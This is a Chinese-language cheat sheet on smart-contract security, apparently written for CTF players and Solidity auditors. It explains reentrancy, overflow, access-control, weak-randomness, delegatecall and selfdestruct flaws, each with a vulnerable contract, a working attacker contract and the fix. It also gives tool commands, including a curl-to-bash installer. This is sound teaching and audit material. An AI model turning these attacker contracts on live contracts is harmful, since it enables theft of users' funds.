# ⛓️ 区块链安全模块

## 适用场景
- 智能合约 CTF
- Solidity 代码审计
- 以太坊 DApp 安全

## 检查清单

```yaml
常见漏洞:
  - [ ] 重入攻击 (Reentrancy)
  - [ ] 整数溢出/下溢
  - [ ] 权限控制问题
  - [ ] 随机数预测
  - [ ] 交易顺序依赖
  - [ ] 拒绝服务 (DoS)
  - [ ] 时间戳依赖
  - [ ] 委托调用 (delegatecall)
  - [ ] 自毁 (selfdestruct)

工具:
  - [ ] Remix IDE
  - [ ] Foundry/Forge
  - [ ] Hardhat
  - [ ] Slither (静态分析)
  - [ ] Mythril (符号执行)
```

## 分析流程

### Step 1: 环境搭建

```bash
# 安装 Foundry (推荐)
curl -L https://foundry.paradigm.xyz | bash
foundryup

# 安装 Hardhat
npm install --save-dev hardhat
npx hardhat

# 安装 Slither (静态分析)
pip3 install slither-analyzer

# 安装 Mythril (符号执行)
pip3 install mythril
```

#### 无工具替代方案
```bash
# 使用在线 IDE
# https://remix.ethereum.org/

# 使用在线工具分析
# https://etherscan.io/ (查看合约源码)
# https://ethervm.io/decompile (反编译)

# 手工分析
# 直接阅读 Solidity 源码
# 使用 web3.js/ethers.js 交互
```

### Step 2: 重入攻击 (Reentrancy)

```solidity
// 漏洞代码
contract Vulnerable {
    mapping(address => uint) public balances;
    
    function withdraw() public {
        uint bal = balances[msg.sender];
        require(bal > 0);
        
        // 先发送 ETH (危险!)
        (bool sent, ) = msg.sender.call{value: bal}("");
        require(sent, "Failed to send Ether");
        
        // 后更新余额
        balances[msg.sender] = 0;
    }
}

// 攻击合约
contract Attacker {
    Vulnerable public vuln;
    
    constructor(address _vuln) {
        vuln = Vulnerable(_vuln);
    }
    
    function attack() external payable {
        vuln.deposit{value: 1 ether}();
        vuln.withdraw();
    }
    
    // 回调函数 - 重入
    receive() external payable {
        if (address(vuln).balance >= 1 ether) {
            vuln.withdraw();
        }
    }
}

// 修复方法
// 1. 使用 Checks-Effects-Interactions 模式
// 2. 使用 ReentrancyGuard
// 3. 先更新状态再转账
```

### Step 3: 整数溢出/下溢

```solidity
// 漏洞代码 (Solidity < 0.8.0)
contract Overflow {
    mapping(address => uint256) public balances;
    
    function transfer(address to, uint256 amount) public {
        require(balances[msg.sender] - amount >= 0);  // 永远为真!
        balances[msg.sender] -= amount;  // 可能下溢
        balances[to] += amount;          // 可能溢出
    }
}

// 攻击
// 如果 balance=0, amount=1
// balance - amount = 2^256 - 1 (下溢)

// Solidity < 0.8.0 修复
// 使用 SafeMath 库
import "@openzeppelin/contracts/utils/math/SafeMath.sol";
using SafeMath for uint256;
balances[msg.sender] = balances[msg.sender].sub(amount);

// Solidity >= 0.8.0
// 默认检查溢出，会 revert
// 可用 unchecked {} 绕过检查
```

### Step 4: 权限控制漏洞

```solidity
// 漏洞代码
contract Vulnerable {
    address public owner;
    
    // 缺少权限检查!
    function setOwner(address _owner) public {
        owner = _owner;
    }
    
    // 或者错误的修饰器
    modifier onlyOwner {
        if (msg.sender == owner) {  // 应该用 require
            _;
        }
    }
}

// 正确写法
modifier onlyOwner {
    require(msg.sender == owner, "Not owner");
    _;
}

// tx.origin 问题
contract Vulnerable {
    address public owner;
    
    // 危险! 可被钓鱼攻击
    function transferOwnership(address newOwner) public {
        require(tx.origin == owner);  // 应该用 msg.sender
        owner = newOwner;
    }
}
```

### Step 5: 随机数预测

```solidity
// 漏洞代码 - 可预测的随机数
contract BadRandom {
    function guess(uint256 _guess) public {
        uint256 answer = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.difficulty,
            msg.sender
        )));
        
        // 矿工可以操控 timestamp 和 difficulty
        // 攻击者可以预计算
        
        if (_guess == answer) {
            // 中奖
        }
    }
}

// 攻击合约
contract Attacker {
    BadRandom target;
    
    function attack() public {
        // 在同一个区块中，计算正确答案
        uint256 answer = uint256(keccak256(abi.encodePacked(
            block.timestamp,
            block.difficulty,
            address(this)  // msg.sender 是攻击合约
        )));
        target.guess(answer);
    }
}

// 安全的随机数
// 使用 Chainlink VRF
// 使用 commit-reveal 模式
```

### Step 6: delegatecall 漏洞

```solidity
// 危险的 delegatecall
contract Proxy {
    address public owner;
    address public implementation;
    
    function forward(bytes memory data) public {
        // delegatecall 使用调用者的 storage!
        (bool success, ) = implementation.delegatecall(data);
        require(success);
    }
}

contract Implementation {
    address public owner;  // slot 0
    
    function setOwner(address _owner) public {
        owner = _owner;  // 修改 Proxy 的 slot 0!
    }
}

// 攻击
// 调用 proxy.forward(abi.encodeWithSignature("setOwner(address)", attacker))
// 这会修改 Proxy.owner 而不是 Implementation.owner

// slot 碰撞攻击
// 如果 storage layout 不同，可能覆盖关键变量
```

### Step 7: 自毁漏洞

```solidity
// 强制发送 ETH
contract Vulnerable {
    function isComplete() public view returns (bool) {
        return address(this).balance == 10 ether;
    }
}

// 攻击合约
contract Attacker {
    function attack(address payable target) public payable {
        // selfdestruct 可以强制发送 ETH
        // 无视目标合约的 receive/fallback
        selfdestruct(target);
    }
}

// 如果 Vulnerable 没有存入过 10 ether
// 但通过 selfdestruct 发送，balance 会强制变化
```

### Step 8: 交互脚本 (Foundry)

```solidity
// test/Attack.t.sol
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "../src/Vulnerable.sol";

contract AttackTest is Test {
    Vulnerable target;
    
    function setUp() public {
        target = new Vulnerable();
    }
    
    function testAttack() public {
        // 攻击代码
        target.vulnerableFunction();
        
        // 验证
        assertTrue(target.pwned());
    }
}

// 运行测试
// forge test -vvvv
```

### Step 9: 交互脚本 (Web3.py)

```python
#!/usr/bin/env python3
"""
Web3.py 交互脚本
"""

from web3 import Web3

# 连接节点
w3 = Web3(Web3.HTTPProvider('http://localhost:8545'))

# 合约 ABI 和地址
contract_address = "0x..."
abi = [...]  # 合约 ABI

# 创建合约实例
contract = w3.eth.contract(address=contract_address, abi=abi)

# 调用只读函数
result = contract.functions.balanceOf(my_address).call()
print(f"Balance: {result}")

# 发送交易
tx = contract.functions.transfer(to_address, amount).build_transaction({
    'from': my_address,
    'gas': 100000,
    'nonce': w3.eth.get_transaction_count(my_address),
})

# 签名并发送
signed_tx = w3.eth.account.sign_transaction(tx, private_key)
tx_hash = w3.eth.send_raw_transaction(signed_tx.rawTransaction)

# 等待确认
receipt = w3.eth.wait_for_transaction_receipt(tx_hash)
print(f"TX Hash: {tx_hash.hex()}")
```

## CTF 常见套路

### 套路 1: 简单重入

脆弱的取款函数，先转账后更新余额

### 套路 2: 猜随机数

使用 block.timestamp 等可预测值作为随机源

### 套路 3: 整数溢出

余额检查可被溢出绕过

### 套路 4: delegatecall 提权

通过 delegatecall 修改代理合约的 owner

### 套路 5: 强制发送 ETH

使用 selfdestruct 打破合约对 balance 的假设

## 无工具替代方案

```bash
# 在线环境
# https://remix.ethereum.org/ - 编译和部署
# https://etherscan.io/ - 查看链上合约

# 直接使用 Node.js
npm install ethers
node attack.js

# 使用 Python
pip install web3
python attack.py

# 手工分析
# 直接阅读 Solidity 源码
# 理解 storage layout
# 跟踪函数调用流程

# 在线反编译
# https://ethervm.io/decompile
# https://contract-library.com/
```

## 工具速查

```bash
# Foundry
forge build                    # 编译
forge test -vvvv               # 测试
forge script script/Attack.s.sol  # 运行脚本
cast call <addr> "func()"      # 调用函数
cast send <addr> "func()" --private-key <key>  # 发送交易

# Slither 静态分析
slither . --print human-summary
slither . --detect reentrancy-eth

# Mythril 符号执行
myth analyze contract.sol

# 在线工具
# Remix IDE: https://remix.ethereum.org/
# Etherscan: https://etherscan.io/
```
